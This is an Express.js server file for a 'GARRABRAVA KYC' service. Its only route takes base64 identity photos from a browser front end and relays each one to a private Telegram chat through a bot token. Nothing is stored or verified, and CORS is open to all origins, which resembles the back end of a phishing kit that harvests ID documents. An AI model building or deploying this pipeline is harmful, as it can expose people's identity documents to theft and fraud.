const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const cors = require('cors'); // <- AGREGADO PARA QUE FUNCIONE EL FRONT
const app = express();
const PORT = process.env.PORT || 1000;

console.log("Iniciando servidor GARRABRAVA KYC...");

// MIDDLEWARES
app.use(cors()); // <- PERMITE PETICIONES DESDE EL FRONT
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({limit: '50mb'}));

// RUTA KYC
app.post('/enviar-kyc', async (req, res) => {
  console.log("Llego POST a /enviar-kyc");
  try {
    const TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if(!TOKEN ||!CHAT_ID) return res.status(200).json({ok: false, error: "Faltan variables TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en Render"});

    const { fotos } = req.body;
    
    // Enviar cada foto a Telegram
    for(const [key, base64] of Object.entries(fotos)){
      if(!base64) continue; // Evita error si viene vacío

      const buffer = Buffer.from(base64.split(',')[1], 'base64');
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('caption', `KYC GARRABRAVA - ${key.toUpperCase()}`);
      form.append('photo', buffer, { filename: `${key}.jpg` });
      
      await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    }
    
    console.log("KYC enviado correctamente a Telegram");
    res.status(200).json({ ok: true }); 
  } catch (e) { 
    console.log("ERROR:", e.message);
    res.status(200).json({ ok: false, error: e.message });
  }
});

app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
